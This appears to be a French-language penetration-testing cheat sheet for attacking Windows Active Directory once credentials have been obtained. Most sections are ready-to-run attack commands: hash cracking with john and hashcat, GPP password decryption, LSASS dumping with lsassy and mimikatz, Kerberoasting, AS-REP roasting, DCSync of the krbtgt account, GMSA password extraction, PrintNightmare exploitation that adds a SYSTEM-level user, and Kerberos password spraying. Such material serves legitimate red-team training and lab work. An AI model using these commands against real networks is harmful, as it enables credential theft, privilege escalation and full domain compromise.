# Attaques Windows avec identifiants

## 1. Obtention d'identifiants / hash NTLM

### 1.1. Cracking

> Prérequis : Hash Net-NTLMv2 obtenu au préalable
>
> Objectif : Obtenir le mot de passe de l'utilisateur

```bash
$ john --format=netntlmv2 --wordlist="/usr/share/wordlists/rockyou.txt" hash.txt

$ hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```



### 1.2. MS14-025 (GPO)

> **SYSVOL** est un partage réseau regroupant entre autre les éléments qui doivent être accessibles pour l’ensemble des ordinateurs du domaine (e.g. scripts de connexion, GPO, …). Il se situe sur les controleurs de domaine.
>
> Prérequis : Accès à un partage SYSVOL sur la machine <IP> (compte du domaine)
>
> Objectif : Obtenir le mot de passe de l'utilisateur utilisé pour appliquer la GPO (généralement l'administrateur local)

```bash
# Connexion au préalable sur le partage SMB SYSVOL
$ cd \DOMAIN\Policies\{UNE-CLE-GPO}\Machine\Preferences\Groups\
$ cat Groups.xml
$ gpp-decrypt <HASHED_PASSWORD>

# Ou plus facile, utilisation du module gpp_password CME
$ crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
```

### 1.3 Dump LSASS

> Récupération des hash NTLM des comptes s'étant connectés sur la machine
>
> Prérequis : compte administrateur local d'une machine cliente
>
> Objectifs : récupérer un hash NTLM d'un compte du domaine

```bash
# A distance
$ crackmapexec smb <IP_PARTAGE> -u USERNAME -p PASSWORD -M lsassy 

# Si déjà connecté sur le poste client
C:\> .\mimikatz.exe 
```



## 2. Exploitation avec identifiants / hash NTLM

### 2.1 Exploitation des partages réseau

#### 2.1.1 Listing des partages réseaux SMB

> Prérequis : Identifiants d'un utilisateur / hash NTLM si le partage est sur le DC
>
> Objectifs : lister les partages réseaux SMB présents sur une machine <IP>

```bash
# Sur une machine cliente
$ crackmapexec smb <IP_CLIENT> -u "USERNAME" -p 'PASSWORD' --shares --local-auth

# Sur un contrôleur de domaine
$ crackmapexec smb <IP_DC> -u "USERNAME" -H <HASH_NTLM> --shares
```

- Si utilisation d'un compte local, spécifier l'option --local-auth ;

- CME vient confirmer les identifiants utilisés et indique la mention "Pwn3d!" si c'est un compte ayant les droits d'un **administrateur local**. Si c'est un compte du domaine, il l'indique en vert.

  

#### 2.1.2 Accès aux partages réseaux SMB

> Prérequis : Identifiants d'un utilisateur / hash NTLM si le partage est sur le DC
>
> Objectifs : accéder et lire les fichiers présents sur les partages réseau SMB

```bash
# Sur une machine client
$ impacket-smbclient 'USERNAME:PASSWORD@<IP_CLIENT>'

# Sur un contrôleur de domaine
$ impacket-smbclient -hashes :<HASH_NTLM> DOMAIN/USERNAME@<IP_DC>     
```

Voir [smbclient](./smbclient.md) pour consulter les actions réalisables



### 2.2 Attaques liées au compte de service

#### 2.2.1 Kerberoasting

> Prérequis : Compte utilisateur avec le droit d'utiliser le service
>
> Objectif : Récupérer un TGS (ticket signé avec le mot de passe du compte de service) pour le cracker et obtenir le mot de passe du compte de service

```bash
$ impacket-GetUserSPNs -request -dc-ip <IP_DC> 'DOMAIN/USERNAME:PASSWORD'
```

Si l'erreur `[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` survient, se mettre à l'heure en synchronisation avec le DC :

```bash
$ sudo ntpdate <IP_DC>
```



#### 2.2.2 ASREP Roasting (WIP)

> Se base sur la possibilité de demander un ticket de service en tant qu'un utilisateur du domaine sans connaître son mot de passe.
>
> Prérequis : Connaissance du compte de service dont on veut un ticket / paramétrage de l'utilisateur de domaine "pas de pré-authentification Kerberos"
>
> Objectif : Récupérer un TGT pour le cracker et obtenir le mot de passe du compte de service

```bash
$ impacket-GetUserSPNs 'DOMAIN/USERNAME' -no-pass
```



#### 2.2.3 DCSync

> Se base sur le fait qu'un compte de service ait les droits de répliquer les modifications d'un annuaire (i.e. synchronisation de tout l'annuaire)
>
> Prérequis : Compte de service avec les droits DCSync
>
> Objectif (court) : Devenir administrateur du domaine (Administrateur ou KRBTGT)
>
> Objectif (long) : Répliquer l'annuaire pour ensuite lire les modifications du fichier NTDS.dit et donc récupérer tous les hash des utilisateurs du domaine, dont l'administrateur du domaine

```bash
$ impacket-secretsdump 'DOMAINE/USERNAME:PASSWORD@<IP_DC>' -just-dc-user krbtgt
```



#### 2.2.4 Exploitation des comptes GMSA

> Dans le cas où on possède les droits de lire les mots de passe d'un compte GMSA (Group Managed Service Accounts)
>
> Prérequis : un compte avec les droits de lecture GMSA
>
> Objectifs : récupérer le hash NTLM du compte GMSA

```powershell
# Besoin d'un powershell
# Liste des comptes GMSA
PS C:\> Get-ADServiceAccount -Filter *
# Récupérer le SamAccountName
PS C:\> $gmsa =  Get-ADServiceAccount -Identity '<SamAccountName>' -Properties 'msDS-ManagedPassword'
PS C:\> $blob = $gmsa.'msDS-ManagedPassword'
# Récupération du mot de passe chiffré (secure)
PS C:\> $mp = ConvertFrom-ADManagedPasswordBlob $blob
# Conversion du mot de passe en hash NTLM
PS C:\> $hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
```



### 2.3 Autre

#### 2.3.3 Print-Nightmare

> Se base sur le fait qu'un utilisateur à moindre privilèges peut ajouter une imprimante et demander d'installer un driver pour cette dernière. C'est le service de spool qui va télécharger et charger ce driver. Ce service est lancé par SYSTEM. Il chargera donc le driver (une dll malicieuse pour RCE) avec ces droits, permettant une élévation de privilèges.
>
> Prérequis : un compte utilisateur sur une machine avec un service de spool (spoolsv) actif
>
> Objectif : Devenir administrateur local (SYSTEM)
>
> Ressource : https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html / https://www.thedutchhacker.com/how-to-exploit-the-printnightmare-cve-2021-34527/

```powershell
&> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
&> import-module .\CVE-2021-1675.ps1
&> Invoke-Nightmare -NewUser "slash" -NewPassword "slash" # création d'un nouvel utilisateur
# Hôte - connexion avec le nouveau compte ayant les droits SYSTEM
$ evil-winrm -i 10.10.11.106 -u slash -p slash
```



#### 2.3.4 Password spraying

> Réutilisation de mots de passe valides
>
> Prérequis : un mot de passe valide avec une liste d'utilisateurs valides et susceptibles d'utiliser également ce mot de passe
>
> Objectif : obtenir un nouveau compte 

```bash
# Password spraying via le protocole Kerberos (pré-authentification)
$ kerbrute bruteuser --dc <NOM_DC> -d <DOMAIN.COM> <USERS_VALIDES_WORDLIST> <MDP_VALIDE>  
```

